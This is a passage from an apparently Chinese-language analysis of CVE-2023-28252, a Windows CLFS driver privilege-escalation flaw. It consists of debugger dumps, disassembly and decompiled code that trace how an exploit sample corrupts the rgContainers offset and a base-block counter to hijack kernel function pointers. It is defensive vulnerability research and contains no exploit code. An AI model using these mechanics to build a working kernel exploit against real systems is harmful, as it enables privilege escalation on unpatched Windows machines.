fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001020 fffff800`53112b20 fffff800`55c2c640</span></span><span style="display:flex;"><span>00000000`05001030 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001040 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001050 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001060 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001070 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>0: kd> u fffff800`53141b60</span></span><span style="display:flex;"><span>CLFS!ClfsMgmtDeregisterManagedClient:</span></span><span style="display:flex;"><span>fffff800`53141b60 48895c2408 mov qword ptr [rsp+8],rbx</span></span><span style="display:flex;"><span>fffff800`53141b65 57 push rdi</span></span><span style="display:flex;"><span>fffff800`53141b66 4883ec20 sub rsp,20h</span></span><span style="display:flex;"><span>fffff800`53141b6a 488bd9 mov rbx,rcx</span></span><span style="display:flex;"><span>fffff800`53141b6d 4885c9 test rcx,rcx</span></span><span style="display:flex;"><span>fffff800`53141b70 0f841ae50000 je CLFS!ClfsMgmtDeregisterManagedClient+0xe530 (fffff800`53150090)</span></span><span style="display:flex;"><span>fffff800`53141b76 4c8b150335feff mov r10,qword ptr [CLFS!_imp_KeEnterCriticalRegion (fffff800`53125080)]</span></span><span style="display:flex;"><span>fffff800`53141b7d e8ae5eb302 call nt!KeEnterCriticalRegion (fffff800`55c77a30)</span></span><span style="display:flex;"><span>0: kd> u fffff800`53112b20</span></span><span style="display:flex;"><span>CLFS!ClfsEarlierLsn:</span></span><span style="display:flex;"><span>fffff800`53112b20 488b0511280000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff800`53115338)]</span></span><span style="display:flex;"><span>fffff800`53112b27 4885c9 test rcx,rcx</span></span><span style="display:flex;"><span>fffff800`53112b2a 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62)</span></span><span style="display:flex;"><span>fffff800`53112b2c 488b09 mov rcx,qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff800`53112b2f 483b0d8a230000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff800`53114ec0)]</span></span><span style="display:flex;"><span>fffff800`53112b36 742a je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62)</span></span><span style="display:flex;"><span>fffff800`53112b38 483bc8 cmp rcx,rax</span></span><span style="display:flex;"><span>fffff800`53112b3b 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62)</span></span></code></pre></div><p>调用pContainer的函数指针汇编如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PAGE:00000001C00337AF E8 2C 0F 00 00 call ?GetSymbol@CClfsBaseFile@@QEAAJJKPEAPEAU_CLFS_CONTAINER_CONTEXT@@@Z ; CClfsBaseFile::GetSymbol(long,ulong,_CLFS_CONTAINER_CONTEXT * *)</span></span><span style="display:flex;"><span>PAGE:00000001C00337AF</span></span><span style="display:flex;"><span>PAGE:00000001C00337B4 8B D8 mov ebx, eax</span></span><span style="display:flex;"><span>PAGE:00000001C00337B6 ; 66: v17 = Symbol;</span></span><span style="display:flex;"><span>PAGE:00000001C00337B6 89 44 24 40 mov [rsp+0B8h+var_78], eax</span></span><span style="display:flex;"><span>PAGE:00000001C00337BA ; 67: if ( Symbol &lt; 0 )</span></span><span style="display:flex;"><span>PAGE:00000001C00337BA 85 C0 test eax, eax</span></span><span style="display:flex;"><span>PAGE:00000001C00337BC ; 68: goto LABEL_21;</span></span><span style="display:flex;"><span>PAGE:00000001C00337BC 0F 88 F1 00 00 00 js loc_1C00338B3</span></span><span style="display:flex;"><span>PAGE:00000001C00337BC</span></span><span style="display:flex;"><span>PAGE:00000001C00337C2 ; 69: v15 = (void (__fastcall ***)(_QWORD))*((_QWORD *)v25 + 3);</span></span><span style="display:flex;"><span>PAGE:00000001C00337C2 48 8B 44 24 70 mov rax, [rsp+0B8h+var_48]</span></span><span style="display:flex;"><span>PAGE:00000001C00337C7 48 8B 48 18 mov rcx, [rax+18h]</span></span><span style="display:flex;"><span>PAGE:00000001C00337CB ; 70: if ( v15 )</span></span><span style="display:flex;"><span>PAGE:00000001C00337CB 48 85 C9 test rcx, rcx</span></span><span style="display:flex;"><span>PAGE:00000001C00337CE 0F 84 EB 00 00 00 jz loc_1C00338BF</span></span><span style="display:flex;"><span>PAGE:00000001C00337CE</span></span><span style="display:flex;"><span>PAGE:00000001C00337D4 ; 73: v7 = v20;</span></span><span style="display:flex;"><span>PAGE:00000001C00337D4 48 8B F9 mov rdi, rcx</span></span><span style="display:flex;"><span>PAGE:00000001C00337D7 ; 72: v20 = (struct CClfsContainer *)*((_QWORD *)v25 + 3);// 调用函数指针</span></span><span style="display:flex;"><span>PAGE:00000001C00337D7 48 89 4C 24 50 mov [rsp+0B8h+var_68], rcx</span></span><span style="display:flex;"><span>PAGE:00000001C00337DC ; 74: (**v15)(v15);</span></span><span style="display:flex;"><span>PAGE:00000001C00337DC 48 8B 01 mov rax, [rcx]</span></span><span style="display:flex;"><span>PAGE:00000001C00337DF 48 8B 00 mov rax, [rax]</span></span><span style="display:flex;"><span>PAGE:00000001C00337E2 FF 15 00 1E FF FF call cs:__guard_dispatch_icall_fptr</span></span></code></pre></div><p>pContainer指向的对象的第一个函数指针指向了ClfsMgmtDeregisterManagedClient，该函数会调用rcx+0x28和rcx+0x8的函数指针。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>NTSTATUS<span style="color:#66d9ef">__stdcall</span><span style="color:#a6e22e">ClfsMgmtDeregisterManagedClient</span>(CLFS_MGMT_CLIENT ClientCookie)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> NTSTATUS v2;<span style="color:#75715e">// edi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ClientCookie )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1073741811</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">KeEnterCriticalRegion</span>();</span></span><span style="display:flex;"><span> v2<span style="color:#f92672">=</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">__int64</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(CLFS_MGMT_CLIENT, _QWORD))(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)ClientCookie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span>i64))(ClientCookie,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(CLFS_MGMT_CLIENT))(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)ClientCookie<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>i64))(ClientCookie);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">KeLeaveCriticalRegion</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v2;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>而rcx指向了0x501000，在内存布局中rcx+0x28和rcx+0x8分别指向了RtlClearBit和ClfsEarlierLsn函数。</p><p>回溯触发过程，容易得出结论，漏洞利用的核心是rgContainers数组被修改导致定位到了错误的container context，在正常文件中rgContainers处偏移为0x1470，在触发漏洞时，该值被修改为了0x1570。错误的container context由攻击者控制，从而控制到了CClfsContainer对象，导致调用了错误的函数指针。</p><p><img src="../../../images/vulnerability/Windows-CLFS-EoP/5.png" alt="" path="vulnerability/Windows-CLFS-EoP/" if="vulnerability/Windows-CLFS-EoP/CVE-2023-28252.zh-cn.md"/></p><p>再次调试，在主blf文件的baselogrecord+0x328位置处下写断点。运行样本。在CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x9a处断下。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1: kd> ba w2 FFFFE381A2303000+0x398</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>0: kd> k</span></span><span style="display:flex;"><span> # Child-SP RetAddr Call Site</span></span><span style="display:flex;"><span>00 ffffa00a`57e30340 fffff800`531519cf CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x9a</span></span><span style="display:flex;"><span>01 ffffa00a`57e303d0 fffff800`5312b839 CLFS!CClfsBaseFilePersisted::ExtendMetadataBlock+0x423</span></span><span style="display:flex;"><span>02 ffffa00a`57e304a0 fffff800`5312ccbc CLFS!CClfsBaseFilePersisted::AddSymbol+0x10d</span></span><span style="display:flex;"><span>03 ffffa00a`57e30520 fffff800`5312b3e6 CLFS!CClfsBaseFilePersisted::AddContainer+0xdc</span></span><span style="display:flex;"><span>04 ffffa00a`57e305d0 fffff800`53154845 CLFS!CClfsLogFcbPhysical::AllocContainer+0x136</span></span><span style="display:flex;"><span>05 ffffa00a`57e30670 fffff800`53132dd5 CLFS!CClfsRequest::AllocContainer+0x27d</span></span><span style="display:flex;"><span>06 ffffa00a`57e30730 fffff800`531328e7 CLFS!CClfsRequest::Dispatch+0x351</span></span><span style="display:flex;"><span>07 ffffa00a`57e30780 fffff800`53132837 CLFS!ClfsDispatchIoRequest+0x87</span></span><span style="display:flex;"><span>08 ffffa00a`57e307d0 fffff800`55c954d5 CLFS!CClfsDriver::LogIoDispatch+0x27</span></span><span style="display:flex;"><span>09 ffffa00a`57e30800 fffff800`560a6048 nt!IofCallDriver+0x55</span></span><span style="display:flex;"><span>0a ffffa00a`57e30840 fffff800`560a5e47 nt!IopSynchronousServiceTail+0x1a8</span></span><span style="display:flex;"><span>0b ffffa00a`57e308e0 fffff800`560a51c6 nt!IopXxxControlFile+0xc67</span></span><span style="display:flex;"><span>0c ffffa00a`57e30a20 fffff800`55e0d8f5 nt!NtDeviceIoControlFile+0x56</span></span><span style="display:flex;"><span>0d ffffa00a`57e30a90 00007ffd`9160d1a4 nt!KiSystemServiceCopyEnd+0x25</span></span><span style="display:flex;"><span>0e 0000009e`74b1b448 00007ffd`8f0c572b ntdll!NtDeviceIoControlFile+0x14</span></span><span style="display:flex;"><span>0f 0000009e`74b1b450 00007ffd`900c5bf1 KERNELBASE!DeviceIoControl+0x6b</span></span><span style="display:flex;"><span>10 0000009e`74b1b4c0 00007ffd`7e4a2895 KERNEL32!DeviceIoControlImplementation+0x81</span></span><span style="display:flex;"><span>11 0000009e`74b1b510 00007ffd`7e4a245c clfsw32!AddLogContainerSet+0x425</span></span><span style="display:flex;"><span>12 0000009e`74b1b5f0 00007ff7`ecad3e82 clfsw32!AddLogContainer+0x3c</span></span><span style="display:flex;"><span>13 0000009e`74b1b630 00007ff7`ecad461c 0624fbfa7618628e1ede80fcc3c36b25+0x3e82</span></span><span style="display:flex;"><span>14 0000009e`74b1f890 00007ffd`900c7614 0624fbfa7618628e1ede80fcc3c36b25+0x461c</span></span><span style="display:flex;"><span>15 0000009e`74b1f8d0 00007ffd`915c26a1 KERNEL32!BaseThreadInitThunk+0x14</span></span><span style="display:flex;"><span>16 0000009e`74b1f900 00000000`00000000 ntdll!RtlUserThreadStart+0x21</span></span></code></pre></div><p>对应的汇编指令为</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53134276</span><span style="color:#ae81ff">4</span>aff0430 inc qword ptr [rax<span style="color:#f92672">+</span>r14]</span></span></code></pre></div><p>在样本中为循环给创建的10个副blf文件添加日志容器</p><p><img src="../../../images/vulnerability/Windows-CLFS-EoP/6.png" alt="" path="vulnerability/Windows-CLFS-EoP/" if="vulnerability/Windows-CLFS-EoP/CVE-2023-28252.zh-cn.md"/></p><hr><p>在CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x9a函数中对应位置伪代码及汇编如下：</p><p>从this+0x30处取指针并解引用，而后访问指针指向的内存偏移24*a2的位置，将该处作为指针赋给v8，v8内存位置偏移0x28后作为指针并解引用赋给v10，v10和v8相加并解引用后自增1</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">WriteMetadataBlock</span>(CClfsBaseFilePersisted<span style="color:#f92672">*</span>this,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,<span style="color:#66d9ef">char</span> a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> v4;<span style="color:#75715e">// rsi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v6;<span style="color:#75715e">// ebx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> v7;<span style="color:#75715e">// r12</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v8;<span style="color:#75715e">// r14</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v9;<span style="color:#75715e">// r15d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v10;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v11;<span style="color:#75715e">// r9</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v12;<span style="color:#75715e">// rdx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> i;<span style="color:#75715e">// esi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>v14;<span style="color:#75715e">// rdx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT<span style="color:#f92672">*</span>v15;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> _QWORD<span style="color:#f92672">*</span>v16;<span style="color:#75715e">// rsi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v18;<span style="color:#75715e">// [rsp+34h] [rbp-54h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v19;<span style="color:#75715e">// [rsp+34h] [rbp-54h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v20;<span style="color:#75715e">// [rsp+3Ch] [rbp-4Ch] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT<span style="color:#f92672">*</span>v21;<span style="color:#75715e">// [rsp+40h] [rbp-48h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v22;<span style="color:#75715e">// [rsp+48h] [rbp-40h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v23;<span style="color:#75715e">// [rsp+50h] [rbp-38h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> BOOLEAN v24;<span style="color:#75715e">// [rsp+A8h] [rbp+20h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v23<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v21<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v24<span style="color:#f92672">=</span><span style="color:#a6e22e">ExAcquireResourceExclusiveLite</span>(<span style="color:#f92672">*</span>((PERESOURCE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>),<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24</span><span style="color:#f92672">*</span> v4<span style="color:#f92672">+</span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>));<span style="color:#75715e">// 获取偏移 (this+0x30h)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v23<span style="color:#f92672">=</span> v8;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v8 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v8<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">**</span>v11<span style="color:#f92672">=</span><span style="color:#f92672">++*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span> v8)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>i64;<span style="color:#f92672">**</span></span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>);</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PAGE:00000001C0034202 48 8B F9 mov rdi, rcx</span></span><span style="display:flex;"><span>PAGE:00000001C0034205 33 DB xor ebx, ebx</span></span><span style="display:flex;"><span>PAGE:00000001C0034207 ; 24: v23 = 0i64;</span></span><span style="display:flex;"><span>PAGE:00000001C0034207 48 89 5C 24 50 mov [rsp+88h+var_38], rbx</span></span><span style="display:flex;"><span>PAGE:00000001C003420C ; 25: v21 = 0i64;</span></span><span style="display:flex;"><span>PAGE:00000001C003420C 48 89 5C 24 40 mov [rsp+88h+var_48], rbx</span></span><span style="display:flex;"><span>PAGE:00000001C0034211 ; 26: v7 = 0;</span></span><span style="display:flex;"><span>PAGE:00000001C0034211 45 32 E4 xor r12b, r12b</span></span><span style="display:flex;"><span>PAGE:00000001C0034214 ; 27: v24 = ExAcquireResourceExclusiveLite(*((PERESOURCE *)this + 4), 1u);</span></span><span style="display:flex;"><span>PAGE:00000001C0034214 44 88 64 24 30 mov [rsp+88h+var_58], r12b</span></span><span style="display:flex;"><span>PAGE:00000001C0034219 B2 01 mov dl, 1 ; Wait</span></span><span style="display:flex;"><span>PAGE:00000001C003421B 48 8B 49 20 mov rcx, [rcx+20h] ; Resource</span></span><span style="display:flex;"><span>PAGE:00000001C003421F 48 FF 15 8A 0E FF FF call cs:__imp_ExAcquireResourceExclusiveLite</span></span><span style="display:flex;"><span>PAGE:00000001C003421F</span></span><span style="display:flex;"><span>PAGE:00000001C0034226 0F 1F 44 00 00 nop dword ptr [rax+rax+00h]</span></span><span style="display:flex;"><span>PAGE:00000001C003422B 88 84 24 A8 00 00 00 mov [rsp+88h+arg_18], al</span></span><span style="display:flex;"><span>PAGE:00000001C003422B</span></span><span style="display:flex;"><span>PAGE:00000001C0034232</span></span><span style="display:flex;"><span>PAGE:00000001C0034232 loc_1C0034232: ; DATA XREF: .rdata:00000001C0017DD0↑o</span></span><span style="display:flex;"><span>PAGE:00000001C0034232 ; __try { // __finally(_CClfsBaseFilePersisted__WriteMetadataBlock____1___fin$0)</span></span><span style="display:flex;"><span>PAGE:00000001C0034232 44 8B EE mov r13d, esi</span></span><span style="display:flex;"><span>PAGE:00000001C0034235 48 8D 0C 75 00 00 00 00 lea rcx, ds:0[rsi*2]</span></span><span style="display:flex;"><span>PAGE:00000001C003423D 48 03 CE add rcx, rsi</span></span><span style="display:flex;"><span>PAGE:00000001C0034240 4C 8D 04 CD 00 00 00 00 lea r8, ds:0[rcx*8]</span></span><span style="display:flex;"><span>PAGE:00000001C0034248 ; 28: v8 = *(_QWORD *)(24 * v4 + *((_QWORD *)this + 6));// 获取偏移 (this+0x30h)</span></span><span style="display:flex;"><span>PAGE:00000001C0034248 48 8B 4F 30 mov rcx, [rdi+30h]</span></span><span style="display:flex;"><span>PAGE:00000001C003424C 4D 8B 34 08 mov r14, [r8+rcx]</span></span><span style="display:flex;"><span>PAGE:00000001C0034250 ; 29: v23 = v8;</span></span><span style="display:flex;"><span>PAGE:00000001C0034250 4C 89 74 24 50 mov [rsp+88h+var_38], r14</span></span><span style="display:flex;"><span>PAGE:00000001C0034255 ; 30: if ( v8 )</span></span><span style="display:flex;"><span>PAGE:00000001C0034255 4D 85 F6 test r14, r14</span></span><span style="display:flex;"><span>PAGE:00000001C0034258 75 10 jnz short loc_1C003426A</span></span><span style="display:flex;"><span>PAGE:00000001C0034258</span></span><span style="display:flex;"><span>PAGE:00000001C003425A ; 74: v9 = -1072037875;</span></span><span style="display:flex;"><span>PAGE:00000001C003425A 41 BF 0D 00 1A C0 mov r15d, 0C01A000Dh</span></span><span style="display:flex;"><span>PAGE:00000001C0034260 ; 75: v18 = -1072037875;</span></span><span style="display:flex;"><span>PAGE:00000001C0034260 44 89 7C 24 34 mov [rsp+88h+var_54], r15d</span></span><span style="display:flex;"><span>PAGE:00000001C0034265 E9 28 01 00 00 jmp loc_1C0034392</span></span><span style="display:flex;"><span>PAGE:00000001C0034265</span></span><span style="display:flex;"><span>PAGE:00000001C003426A ; ---------------------------------------------------------------------------</span></span><span style="display:flex;"><span>PAGE:00000001C003426A ; 32: v7 = 1;</span></span><span style="display:flex;"><span>PAGE:00000001C003426A</span></span><span style="display:flex;"><span>PAGE:00000001C003426A loc_1C003426A: ; CODE XREF: CClfsBaseFilePersisted::WriteMetadataBlock(ulong,uchar)+78↑j</span></span><span style="display:flex;"><span>PAGE:00000001C003426A 41 B4 01 mov r12b, 1</span></span><span style="display:flex;"><span>PAGE:00000001C003426D ; 33: v10 = *(unsigned int *)(v8 + 40);</span></span><span style="display:flex;"><span>PAGE:00000001C003426D 44 88 64 24 30 mov [rsp+88h+var_58], r12b</span></span><span style="display:flex;"><span>PAGE:00000001C0034272 41 8B 46 28 mov eax, [r14+28h]</span></span><span style="display:flex;"><span>PAGE:00000001C0034276 ; 34: v11 = ++*(_QWORD *)(v10 + v8) &amp; 1i64;</span></span><span style="display:flex;"><span>PAGE:00000001C0034276 4A FF 04 30 **inc qword ptr [rax+r14]**</span></span></code></pre></div><p>在zscaler对CVE-2022-37969的分析中提到过CClfsBaseFilePersisted类结构，CClfsBaseFilePersisted类的this+0x30处存储了一个指向堆缓冲区的指针，该缓冲区大小为0xa0，在缓冲区0x30偏移处存储了指向base block的指针，如下所示：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> dps rdi</span></span><span style="display:flex;"><span>ffffa289`156cc000 fffff800`53114020 CLFS!CClfsBaseFilePersisted::`vftable'</span></span><span style="display:flex;"><span>ffffa289`156cc008 ffffffff`00000001</span></span><span style="display:flex;"><span>ffffa289`156cc010 00000000`00000000</span></span><span style="display:flex;"><span>ffffa289`156cc018 00000018`00000000</span></span><span style="display:flex;"><span>ffffa289`156cc020 ffffa289`1469a310</span></span><span style="display:flex;"><span>ffffa289`156cc028 00000000`19630006</span></span><span style="display:flex;"><span>ffffa289`156cc030 **ffffa289`19254810 // 堆指针**</span></span><span style="display:flex;"><span>ffffa289`156cc038 ffffa289`17bfd4d0</span></span><span style="display:flex;"><span>ffffa289`156cc040 ffffe381`a8743088</span></span><span style="display:flex;"><span>ffffa289`156cc048 00000000`0000000b</span></span><span style="display:flex;"><span>ffffa289`156cc050 ffffa289`156cc000</span></span><span style="display:flex;"><span>ffffa289`156cc058 ffffe381`a87430e0</span></span><span style="display:flex;"><span>ffffa289`156cc060 00000000`0000000b</span></span><span style="display:flex;"><span>ffffa289`156cc068 ffffa289`156cc000</span></span><span style="display:flex;"><span>ffffa289`156cc070 ffffe381`a8743138</span></span><span style="display:flex;"><span>ffffa289`156cc078 00000000`0000000b</span></span><span style="display:flex;"><span>0: kd> dq ffffa289`19254810</span></span><span style="display:flex;"><span>ffffa289`19254810 ffffe381`a5c7f680 00000000`00000400</span></span><span style="display:flex;"><span>ffffa289`19254820 00000000`00000000 ffffe381`a5c7f680</span></span><span style="display:flex;"><span>ffffa289`19254830 00000400`00000400 00000000`00000001</span></span><span style="display:flex;"><span>ffffa289`19254840 **ffffe381`a8743000** 00000800`00007a00 **// 指向了base block**</span></span><span style="display:flex;"><span>ffffa289`19254850 00000000`00000002 ffffe381`a8743000</span></span><span style="display:flex;"><span>ffffa289`19254860 00008200`00007a00 00000000`00000003</span></span><span style="display:flex;"><span>ffffa289`19254870 ffffe381`a5353cc0 0000fc00`00000200</span></span><span style="display:flex;"><span>ffffa289`19254880 00000000`00000004 ffffe381`a5353cc0</span></span><span style="display:flex;"><span>0: kd> db ffffe381`a8743000 **// base block内容**</span></span><span style="display:flex;"><span>ffffe381`a8743000 15 00 01 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=.........</span></span><span style="display:flex;"><span>ffffe381`a8743010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................</span></span><span style="display:flex;"><span>ffffe381`a8743020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p.......</span></span><span style="display:flex;"><span>ffffe381`a8743030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffe381`a8743040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffe381`a8743050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffe381`a8743060 00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00 .........y......</span></span><span style="display:flex;"><span>ffffe381`a8743070 01 00 00 00 00 00 00 00-9c 06 ce e1 00 1c ee 11 ................</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>0: kd> !pool ffffe381`a8743000</span></span><span style="display:flex;"><span>Pool page ffffe381a8743000 region is Paged pool</span></span><span style="display:flex;"><span>*ffffe381a8743000 : large page allocation, tag is Clfs, size is 0x7a00 bytes</span></span><span style="display:flex;"><span> Pooltag Clfs : CLFS General buffer, or owner page lookaside list, Binary : clfs.sys</span></span></code></pre></div><hr><p>回到调试器中r14和rax寄存器值分别问ffffe381a2303030和0000000000000369</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> rr14</span></span><span style="display:flex;"><span>r14=ffffe381a2303030</span></span><span style="display:flex;"><span>0: kd> rrax</span></span><span style="display:flex;"><span>rax=0000000000000369</span></span></code></pre></div><p>可以看出ffffe381a2303030位于主blf文件的base block + 0x30位置，rax值取自于base block + 0x30 + 0x28</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db ffffe381a2303030<span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span></span></span><span style="display:flex;"><span>ffffe381<span style="color:#960050;background-color:#1e0010">`</span>a2303058<span style="color:#ae81ff">69</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> i...............</span></span></code></pre></div><p>所以代码会让主blf的base block + 0x30 + 0x369 = base block 